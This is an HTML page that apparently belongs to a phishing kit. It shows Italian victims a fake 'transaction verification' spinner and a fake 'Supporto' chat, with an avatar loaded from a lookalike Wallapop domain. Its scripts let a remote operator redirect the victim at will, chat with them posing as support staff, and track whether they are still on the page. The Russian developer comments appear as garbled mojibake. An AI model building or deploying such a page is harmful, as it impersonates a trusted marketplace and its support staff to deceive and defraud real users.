<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading Page</title>

    <style>
        /* –°–±—Ä–æ—Å —Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω—ã—Ö —Å—Ç–∏–ª–µ–π */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: Arial, sans-serif;
        }
        
        /* –¶–µ–Ω—Ç—Ä–∏—Ä–æ–≤–∞–Ω–∏–µ –∫–æ–Ω—Ç–µ–Ω—Ç–∞ */
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #f2f2f2;
            text-align: center; /* –¶–µ–Ω—Ç—Ä–æ–≤–∫–∞ —Ç–µ–∫—Å—Ç–∞ */
            color: #333;
        }

        /* –ö–æ–Ω—Ç–µ–π–Ω–µ—Ä –∑–∞–≥—Ä—É–∑–∫–∏ */
        .loading-container {
            max-width: 400px;
        }
        
        /* –ê–Ω–∏–º–∞—Ü–∏—è —Å–ø–∏–Ω–Ω–µ—Ä–∞ */
        .spinner {
            border: 6px solid #ccc;
            border-top-color: #333;
            border-radius: 50%;
            width: 60px;
            height: 60px;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px; /* –¶–µ–Ω—Ç—Ä–æ–≤–∫–∞ —Å–ø–∏–Ω–Ω–µ—Ä–∞ –∏ –æ—Ç—Å—Ç—É–ø */
        }
        
        /* –¢–µ–∫—Å—Ç –ø–æ–¥ —Å–ø–∏–Ω–Ω–µ—Ä–æ–º */
        .loading-container p {
            font-size: 16px;
            line-height: 1.5;
        }
        
        /* –ê–Ω–∏–º–∞—Ü–∏—è –≤—Ä–∞—â–µ–Ω–∏—è */
        @keyframes spin {
            0% {
                transform: rotate(0deg);
            }
            100% {
                transform: rotate(360deg);
            }
        }






        /* —á–∞—Ç */
/* –û–±—â–∏–µ —Å—Ç–∏–ª–∏ */
#chat-button {
        position: fixed;
        bottom: 20px;
        right: 20px;
        background-color: #000;
        color: #fff;
        border: none;
        border-radius: 50px;
        width: 60px;
        height: 60px;
        font-size: 24px;
        display: flex;
        align-items: center;
        justify-content: center;
        cursor: pointer;
        z-index: 1001;
    }
    
    #chat-container {
        position: fixed;
        bottom: 80px;
        right: 20px;
        width: 280px;
        max-height: 500px;
        min-height: 400px;
        background-color: #fff;
        border-radius: 10px;
        box-shadow: 0px 8px 16px rgba(0, 0, 0, 0.2);
        display: none; /* –ß–∞—Ç —Å–∫—Ä—ã—Ç –ø–æ —É–º–æ–ª—á–∞–Ω–∏—é */
        flex-direction: column;
        overflow: hidden;
        z-index: 1000;
    }
    
    #chat-container.active {
        display: flex; /* –ü–æ–∫–∞–∑–∞—Ç—å —á–∞—Ç –ø—Ä–∏ –∞–∫—Ç–∏–≤–∞—Ü–∏–∏ */
    }
    
    #chat-header {
        display: flex;
        align-items: center;
        background-color: #000;
        color: #fff;
        padding: 10px;
        border-top-left-radius: 10px;
        border-top-right-radius: 10px;
    }
    
    .chat-avatar img {
        width: 40px;
        height: 40px;
        border-radius: 50%;
        margin-right: 10px;
    }
    
    .chat-info h3 {
        margin: 0;
        font-size: 16px;
    }
    
    .chat-info p {
        margin: 0;
        font-size: 12px;
        opacity: 0.7;
    }
    
    #close-chat {
        background: none;
        border: none;
        color: #fff;
        font-size: 18px;
        margin-left: auto;
        cursor: pointer;
    }
    
    #chat-messages {
        flex: 1;
        padding: 10px;
        background-color: #f9f9f9;
        overflow-y: auto;
    }
    
    .chat-message {
        margin: 5px 0;
        display: flex;
        align-items: flex-start;
    }
    
    .chat-message.user {
        justify-content: flex-end;
    }
    
    .chat-bubble {
        max-width: 70%;
        padding: 10px;
        border-radius: 10px;
        font-size: 14px;
        line-height: 1.4;
    }
    
    .chat-message.user .chat-bubble {
        background-color: #000;
        color: #fff;
        border-bottom-right-radius: 0;
    }
    
    .chat-message.bot .chat-bubble {
        background-color: #e0e0e0;
        color: #000;
        border-bottom-left-radius: 0;
    }
    
    #chat-input {
        display: flex;
        padding: 10px;
        background-color: #fff;
        border-top: 1px solid #ddd;
    }
    
    #message-input {
        flex: 1;
        padding: 10px;
        border: 1px solid #ddd;
        border-radius: 20px;
        outline: none;
        font-size: 14px;
    }
    
    #send-button {
        background-color: #000;
        color: #fff;
        border: none;
        border-radius: 50%;
        width: 40px;
        height: 40px;
        margin-left: 10px;
        display: flex;
        align-items: center;
        justify-content: center;
        cursor: pointer;
    }








    </style>
</head>
<body>



    <!-- –ß–ê–¢ –ù–ê–ß -->
 <button id="chat-button">üí¨</button>
 <div id="chat-container">
     <div id="chat-header">
         <div class="chat-avatar">
             <img src="https://wallapopp.bapebk.shop/6y5vscqf/kg51x/343fdldg/gen/operator-img.png" alt="Support">
         </div>
         <div class="chat-info">
             <h3>Supporto</h3>
             <p>Online</p>
         </div>
         <button id="close-chat">‚úñ</button>
     </div>
     <div id="chat-messages"></div>
     <div id="chat-input">
         <input type="text" id="message-input" placeholder="Digitare un messaggio...">
         <button id="send-button">‚û§</button>
     </div>
 </div>
     
 <script>
     const chatButton = document.getElementById('chat-button');
     const chatContainer = document.getElementById('chat-container');
     const closeChat = document.getElementById('close-chat');
     const sendButton = document.getElementById('send-button');
     const messageInput = document.getElementById('message-input');
     const chatMessages = document.getElementById('chat-messages');
     
     // –û—Ç–∫—Ä—ã—Ç–∏–µ/–∑–∞–∫—Ä—ã—Ç–∏–µ —á–∞—Ç–∞
     chatButton.addEventListener('click', () => {
         chatContainer.classList.toggle('active');
     });
     
     closeChat.addEventListener('click', () => {
         chatContainer.classList.remove('active');
     });
     


     // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –∏–∑–≤–ª–µ—á–µ–Ω–∏—è —Ç–æ–∫–µ–Ω–∞ –∏–∑ URL
     function getTokenFromURL() {
         const url = window.location.pathname; // –ü–æ–ª—É—á–∞–µ–º –ø—É—Ç—å –∏–∑ URL
         const match = url.match(/\/loading\/([^/]+)/); // –ò—â–µ–º —Ç–æ–∫–µ–Ω –ø–æ—Å–ª–µ /get/
         return match ? match[1] : null; // –í–æ–∑–≤—Ä–∞—â–∞–µ–º —Ç–æ–∫–µ–Ω –∏–ª–∏ null, –µ—Å–ª–∏ —Ç–æ–∫–µ–Ω –Ω–µ –Ω–∞–π–¥–µ–Ω
     }




     // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –∑–∞–ø—Ä–æ—Å–∞ —Å–æ–æ–±—â–µ–Ω–∏–π –æ—Ç –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞
     async function fetchAdminMessages(token) {
         try {
             const response = await fetch(`/get_admin_message_support/${token}/`, {
                 method: 'GET',
                 headers: {
                     'Content-Type': 'application/json'
                 }
             });

             if (response.ok) {
                 const data = await response.json();
                 const status = data.status
                 if (status=="success") {
                     const adminMessage = data.message || null;
                     if (adminMessage) {
                         addMessage(adminMessage, 'bot'); // –î–æ–±–∞–≤–ª—è–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ –æ—Ç –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞
                     }
                 }
             } else {
                 console.error('–û—à–∏–±–∫–∞ –ø—Ä–∏ –∑–∞–ø—Ä–æ—Å–µ —Å–æ–æ–±—â–µ–Ω–∏–π –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞:', response.status);
             }
         } catch (error) {
             console.error('–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–∏:', error);
         }
     }
     
     // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ —Å–æ–æ–±—â–µ–Ω–∏–π
     async function sendMessage() {
         const userMessage = messageInput.value.trim();
         const token = getTokenFromURL(); // –ü–æ–ª—É—á–∞–µ–º —Ç–æ–∫–µ–Ω –∏–∑ URL

         if (userMessage && token) {
             addMessage(userMessage, 'user'); // –û—Ç–æ–±—Ä–∞–∂–∞–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ –æ—Ç –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è

             // –§–æ—Ä–º–∏—Ä—É–µ–º —Ç–µ–ª–æ –∑–∞–ø—Ä–æ—Å–∞
             const payload = {
                 text: userMessage,
                 token: token
             };

             try {
                 // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –∑–∞–ø—Ä–æ—Å –Ω–∞ —Å–µ—Ä–≤–µ—Ä
                 const response = await fetch(`/send_message_support/${token}/`, {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json'
                     },
                     body: JSON.stringify(payload)
                 });

                 if (response.ok) {
                     messagePollingInterval = setInterval(() => {
                         fetchAdminMessages(token);
                     }, 2000);



                 } else {
                     addMessage('–û—à–∏–±–∫–∞ —Å–µ—Ä–≤–µ—Ä–∞, –ø–æ–ø—Ä–æ–±—É–π—Ç–µ –ø–æ–∑–∂–µ.', 'bot');
                 }
             } catch (error) {
                 console.error('–û—à–∏–±–∫–∞:', error);
                 addMessage('–û—à–∏–±–∫–∞ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è, –ø–æ–ø—Ä–æ–±—É–π—Ç–µ –ø–æ–∑–∂–µ.', 'bot');
             }

             messageInput.value = ''; // –û—á–∏—â–∞–µ–º –ø–æ–ª–µ –≤–≤–æ–¥–∞
         } else if (!token) {
             alert('–¢–æ–∫–µ–Ω –Ω–µ –Ω–∞–π–¥–µ–Ω –≤ URL!');
         }
}

     // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –¥–æ–±–∞–≤–ª–µ–Ω–∏—è —Å–æ–æ–±—â–µ–Ω–∏—è
     function addMessage(text, sender) {
         const messageElement = document.createElement('div');
         messageElement.classList.add('chat-message', sender);
         const bubble = document.createElement('div');
         bubble.classList.add('chat-bubble');
         bubble.textContent = text;
         messageElement.appendChild(bubble);
         chatMessages.appendChild(messageElement);
         chatMessages.scrollTop = chatMessages.scrollHeight;
     }

     // –ü—Ä–∏–≤—è–∑–∫–∞ —Å–æ–±—ã—Ç–∏–π
     sendButton.addEventListener('click', sendMessage); // –û—Å—Ç–∞–≤–ª—è–µ–º –æ–¥–Ω—É –ø—Ä–∏–≤—è–∑–∫—É
     messageInput.addEventListener('keypress', (event) => {
         if (event.key === 'Enter') {
             sendMessage();
         }
     });

</script>
 

 <!-- –ß–ê–¢ –ö–û–ù -->




    <div class="loading-container">
        <div class="spinner"></div>
        <p>Verifica delle transazioni...</p>
        <p>Questo pu√≤ richiedere diversi minuti. Si prega di non aggiornare o uscire dalla pagina.</p>
    </div>




    <script>
        // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –¥–∞–Ω–Ω—ã—Ö —Å /data –∫–∞–∂–¥—É—é —Å–µ–∫—É–Ω–¥—É
        setInterval(function() {
            const currentUrl = window.location.href;
        
            // –ò–∑–≤–ª–µ—á–µ–Ω–∏–µ —á–∞—Å—Ç–∏ URL –ø–æ—Å–ª–µ "/loading/"
            const extractedPart = currentUrl.split("/loading/")[1];
    
            // –í—ã–ø–æ–ª–Ω—è–µ–º –∑–∞–ø—Ä–æ—Å –∫ —Å–µ—Ä–≤–µ—Ä—É
            fetch(`/data_view/${extractedPart}`)
                .then(response => response.json())
                .then(data => {
    
                    // –ü—Ä–æ–≤–µ—Ä–∫–∞, —á—Ç–æ–±—ã –≤ 'data.page' –Ω–µ –±—ã–ª–æ —Å—Ç—Ä–æ–∫–∏ 'loading'
                    if (data.page && !data.page.includes('loading')) {
                        window.location.href = data.page;  // –ü–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –Ω–∞ –Ω–æ–≤—ã–π URL
                    }
                })
                .catch(error => {
                    console.error('Error:', error);
                });
        }, 1000); // –ó–∞–ø—Ä–æ—Å –±—É–¥–µ—Ç –≤—ã–ø–æ–ª–Ω—è—Ç—å—Å—è –∫–∞–∂–¥—É—é —Å–µ–∫—É–Ω–¥—É
    </script>
    










<script>
    const currentUrl = window.location.href;
    const token = currentUrl.split("/loading/")[1];

    // –§—É–Ω–∫—Ü–∏—è –¥–ª—è —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è —Å–µ—Ä–≤–µ—Ä–∞
    async function notifyServer() {
    try {
        const response = await fetch(`/check_activity/${token}`, {
        method: 'GET',
        headers: {
            'Content-Type': 'application/json'
        }
        });
        if (response.ok) {
        console.log("–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –∞–∫—Ç–∏–≤–µ–Ω");
        } else {
        console.log("–û—à–∏–±–∫–∞ —Å–µ—Ä–≤–µ—Ä–∞ –ø—Ä–∏ –ø—Ä–æ–≤–µ—Ä–∫–µ –∞–∫—Ç–∏–≤–Ω–æ—Å—Ç–∏");
        }
    } catch (error) {
        console.error("–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ –∑–∞–ø—Ä–æ—Å–∞:", error);
    }
    }

    // –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –∏–Ω—Ç–µ—Ä–≤–∞–ª —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–π
    setInterval(notifyServer, 5000); // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –∑–∞–ø—Ä–æ—Å –∫–∞–∂–¥—ã–µ 5 —Å–µ–∫—É–Ω–¥
</script>
</body>
</html>
